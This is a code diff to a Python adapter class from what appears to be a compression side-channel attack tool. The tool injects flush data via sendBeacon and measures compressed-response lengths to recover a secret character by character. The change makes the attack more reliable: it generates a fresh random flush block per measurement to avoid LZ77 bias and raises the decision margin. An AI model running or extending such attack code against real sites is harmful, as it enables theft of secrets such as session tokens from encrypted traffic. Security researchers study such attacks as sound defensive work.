@@ -29,34 +29,27 @@ class BeastAdapter:
         self._bridge = bridge
         self._config: AttackConfig | None = None
         self._session: "aiohttp.ClientSession | None" = None
-        self._flush_data: bytes | None = None
 
     async def setup(self, config: AttackConfig, http_session: "aiohttp.ClientSession") -> None:
         self._config = config
         self._session = http_session
-        # Cache one flush block for the life of the attack. Legacy
-        # attack_beast.py regenerated the flush on every outlier retry;
-        # the engine's retry (engine.py) re-invokes measure_once without
-        # refreshing adapter state, so we reuse the same block. Chrome's
-        # outlier trigger is TCP connection reuse (not flush content),
-        # so this simplification is expected to be harmless — Task 12
-        # correctness gate is the authoritative check.
-        self._flush_data = _make_flush(config)
 
     async def teardown(self) -> None:
         self._config = None
         self._session = None
-        self._flush_data = None
 
     async def measure_once(
         self, prefix: bytes, candidate: bytes, alignment: bytes,
     ) -> int:
         cfg = self._config
-        assert cfg is not None and self._session is not None and self._flush_data is not None
+        assert cfg is not None and self._session is not None
 
-        # 1. Flush via sendBeacon
+        # 1. Flush via sendBeacon. A fresh random block per measurement
+        # prevents any specific flush content from creating a persistent
+        # LZ77-bias that survives averaging across rounds — the fatal
+        # mode that a cached flush would cause.
         if cfg.flush_bytes > 0:
-            await self._bridge.inject(self._flush_data)
+            await self._bridge.inject(_make_flush(cfg))
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
 
@@ -82,7 +75,7 @@ class BeastAdapter:
             alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
             max_length=32,
             terminator=b"\r",
-            min_margin=48,
+            min_margin=64,
             max_rounds=64,
             settle=0.01,
             alignment_mode=AlignmentMode.FULL_SWEEP,
